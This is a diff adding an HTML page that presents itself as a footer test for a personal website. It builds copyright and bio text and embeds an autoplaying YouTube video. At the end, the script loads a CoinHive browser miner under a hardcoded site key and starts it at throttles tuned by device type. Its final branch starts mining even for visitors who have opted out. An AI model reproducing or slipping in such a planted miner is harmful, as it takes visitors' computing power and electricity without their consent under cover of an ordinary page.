@@ -1,0 +1,128 @@
+<!DOCTYPE HTML>
+<html lang="en">
+	<head id="head">
+		<title>MaX Saxe Design Web Footer3.js Inline Test</title>
+	</head>
+	<body id="body">
+		<script src="https://authedmine.com/lib/authedmine.min.js"></script>
+		<script>
+		// SECTION 0
+		var s0 = document.createElement("SECTION");
+
+		// PARAGRAPH 0
+		var p0 = document.createElement("P");
+		var p0A0 = document.createElement("A");
+		var p0A0A = document.createTextNode("MaX Falstein Website");
+		p0A0.setAttribute("href", "http://mf");
+		p0A0.appendChild(p0A0A);
+		var copy = document.createTextNode(" \u00A9 ");
+		var p0A1 = document.createElement("A");
+		var p0A1A = document.createTextNode("MaX Falstein");
+		p0A1.setAttribute("href", "https://lnk.bio/MaX"); // or max.risqué
+		p0A1.appendChild(p0A1A);
+		var and = document.createTextNode(" & ");
+		var p0A2 = document.createElement("A");
+		var p0A2A = document.createTextNode("Falstein Inc.");
+		p0A2.setAttribute("href", "http://fi");
+		p0A2.appendChild(p0A2A);
+		var period = document.createTextNode(" — ");
+		var d = new Date();
+		var year = d.getFullYear().toString();
+		var m = ["January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December"];
+		var month = m[d.getMonth()];
+		var footerMonth = document.createTextNode(month);
+		var gap = document.createTextNode(" ");
+		var footerYear = document.createTextNode(year);
+		var patent = document.createTextNode(" - Patents & Trademarks Pending");
+		p0.appendChild(p0A0);
+		p0.appendChild(copy);
+		p0.appendChild(p0A1);
+		p0.appendChild(and);
+		p0.appendChild(p0A2);
+		p0.appendChild(period);
+		p0.appendChild(footerMonth);
+		p0.appendChild(gap);
+		p0.appendChild(footerYear);
+		p0.appendChild(patent);
+
+		// PARAGRAPH 1
+		var p1 = document.createElement("P");
+		var p1A = document.createTextNode("MaX Falstein");
+		var br = document.createElement("BR");
+		var p1B = document.createTextNode("Computer Stack (H/W, Net, Security, S/W) Architect, Designer, Engineer & Researcher | Executive & Founder | Investor 📈");
+		p1.appendChild(p1A);
+		p1.appendChild(br);
+		p1.appendChild(p1B);
+
+		// PARAGRAPH 2
+		var p2 = document.createElement("P");
+		var p2A = document.createTextNode("");
+
+		// PARAGRAPH 3
+		var p3 = document.createElement("P");
+		var p3A = document.createTextNode("");
+
+		s0.appendChild(p0);
+		s0.appendChild(p1);
+		s0.appendChild(p2);
+		s0.appendChild(p3);
+
+		// SECTION 1
+		var s1 = document.createElement("SECTION");
+
+		// PARAGRAPH 4
+		var s1P0 = document.createElement("P");
+		var s1P0A = document.createTextNode("A quick little message from MaX saying thank you for visiting the repository!");
+
+		// var s1I0 = document.createElement("IFRAME");
+		var s1I0 = ytIframe("FPI9Rt1PIkY", true);
+
+		function ytIframe(uri, autoplay) {
+			var href = window.location.href;
+			var origin = "origin=".concat(href);
+			var autoplayTrue = "?autoplay=1&";
+			var autoplayFalse = "?autoplay=0&";
+			var ytEmbed = "https://www.youtube.com/embed/".concat(uri);
+			if (autoplay == true) {
+			  var curi = ytEmbed.concat(autoplayTrue).concat(origin);
+			} else {
+			  var curi = ytEmbed.concat(autoplayFalse).concat(origin);
+			}
+			var s1Iframe = document.createElement("IFRAME");
+			s1Iframe.src = encodeURI(curi);
+			s1Iframe.style.width = "560px";
+			s1Iframe.style.height = "315px";
+			s1Iframe.frameborder = "0";
+			s1Iframe.allow ="autoplay; encrypted-media; allowfullscreen";
+			s1Iframe.setAttribute('allowFullScreen', '');
+			return s1Iframe;
+		}
+
+		var s1P0B = document.createTextNode("MaX hopes you enjoyed the little video message.");
+
+		s1.appendChild(s1P0A);
+		s1.appendChild(s1I0);
+		s1.appendChild(s1P0B);
+
+		var footer = document.createElement("FOOTER");
+		footer.appendChild(s0);
+		footer.appendChild(s1);
+		document.getElementById("body").appendChild(footer);
+		var minerSetup = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
+		if (!minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
+		  // desktop @ 70%
+		  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.3});
+		  miner.start();
+		} else if (minerSetup.isMobile() && !minerSetup.didOptOut(900)) {
+		  // mobile @ 30%
+		  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.7});
+		  miner.start();
+		} else {
+		  // unknown device @ 50%
+		  var miner = new CoinHive.Anonymous('TaisfdcTxYepHiUV68XbnzjUp7FXaTyT', {throttle: 0.5});
+		  miner.start();
+		}
+
+		</script>
+	</body>
+</html>
